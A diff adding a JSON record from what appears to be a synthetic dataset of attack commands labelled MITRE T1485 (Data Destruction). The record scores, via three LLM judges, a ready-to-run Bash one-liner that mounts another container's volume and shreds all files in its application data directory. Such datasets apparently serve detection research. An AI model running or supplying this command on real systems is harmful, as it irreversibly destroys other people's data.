@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1485",
+  "platform": "Containers",
+  "shell": "Bash",
+  "command": "docker run --rm --volumes-from api01 ubuntu bash -lc 'd=/var/lib/app/data; [ -d \"$d\" ] && find \"$d\" -xdev -type f -print0 | xargs -0 -r shred -n 2 -z -u; sync'",
+  "explanation": "Uses --volumes-from to access the api01 container's data volume and securely overwrites and deletes all files under the app data directory, then flushes writes.",
+  "rationale_steps": [
+    "Reuse api01's mounted volumes via --volumes-from",
+    "Limit scope to the intended directory to prevent collateral damage",
+    "Shred with multiple passes and zeroing, then unlink",
+    "Sync changes to disk"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-763669c5-b18fe627",
+  "source_prompt_hash": "763669c5",
+  "timestamp_utc": "2025-09-30T08:01:03.936632Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for all tools used (docker run, find, xargs, shred), correct command separators, and proper variable handling.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the Data Destruction technique by using shred to securely overwrite files with random data (2 passes via -n 2), zero them out (-z), and unlink them (-u) in a container volume, making recovery extremely difficult.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T02:38:11.648602Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct syntax for all utilities used.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely aligns with T1485 Data Destruction, using `shred` (an explicitly mentioned tool) with flags for secure overwriting and deletion, targeting application data via a mounted volume, and flushing writes to ensure persistence, making data unrecoverable as intended.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:38:14.972378Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with correct Docker/run syntax, balanced quoting, proper pipelines and separators, and valid flags for find, xargs, and shred.",
+        "semantic_score": 5,
+        "semantic_justification": "It mounts the target container\u2019s volume and uses find+xargs with shred -n 2 -z -u to securely overwrite and delete files in the specified directory, then syncs, aligning with data destruction (T1485).",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:38:35.100277Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
